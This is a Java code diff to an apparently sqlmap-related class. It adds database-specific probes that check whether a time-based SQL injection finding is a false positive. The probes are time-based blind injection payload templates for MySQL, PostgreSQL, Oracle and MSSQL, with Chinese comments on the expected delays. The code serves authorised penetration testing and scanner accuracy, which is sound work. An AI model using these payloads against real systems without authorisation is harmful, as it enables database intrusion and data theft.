@@ -128,15 +128,59 @@ public final class SqlmapTimeModel {
      * 任一不符 → 该注入点是假阳性（站点不按条件执行 SQL，延迟来自抖动）。
      */
     public static List<FalsePositiveProbe> falsePositiveProbes(int r1, int r2, int r3) {
-        String tpl = " AND (SELECT {R} FROM (SELECT(SLEEP({S}-(IF((%s),0,{S}))))){C})";
-        return List.of(
-                new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
-                new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
-                new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
-                new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
-                new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
-                new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟")
-        );
+        return falsePositiveProbes("MySQL", r1, r2, r3);
+    }
+
+    /**
+     * 按 DBMS 生成假阳性检查表达式（v4.0.1 修复：此前无条件用 MySQL 语法，
+     * 导致 Oracle/PG 的真注入因语法错误秒回被误判假阳性）。
+     * 不支持的 DBMS 返回空列表 = {@code 跳过检查}（不是判假阳性）。
+     */
+    public static List<FalsePositiveProbe> falsePositiveProbes(String db, int r1, int r2, int r3) {
+        switch (db == null ? "" : db) {
+            case "MySQL": {
+                String tpl = " AND (SELECT {R} FROM (SELECT(SLEEP({S}-(IF((%s),0,{S}))))){C})";
+                return List.of(
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
+                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
+            }
+            case "PostgreSQL": {
+                String tpl = " AND CASE WHEN (%s) THEN pg_sleep({S})::text ELSE '' END=''";
+                return List.of(
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
+                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
+            }
+            case "Oracle": {
+                String tpl = " AND (CASE WHEN (%s) THEN DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S}) ELSE 1 END)={R}";
+                return List.of(
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
+                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
+            }
+            case "MSSQL": {
+                String tpl = "; IF(%s) WAITFOR DELAY '0:0:{S}'-- -";
+                return List.of(
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r1), true, "r1=r1必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r2 + "=" + r2), true, "r2=r2必须延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r2), false, "r1=r2必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r1 + "=" + r3), false, "r1=r3必须不延迟"),
+                        new FalsePositiveProbe(String.format(tpl, r3 + "=" + r2), false, "r3=r2必须不延迟"),
+                        new FalsePositiveProbe(" " + r3 + " " + r2, false, "非法语句必须不延迟"));
+            }
+            default:
+                return List.of(); // 无对应语法 → 跳过交叉验证，不误杀
+        }
     }
 
     /** 渲染 clause 占位（{S}/{R}/{C}）。 */
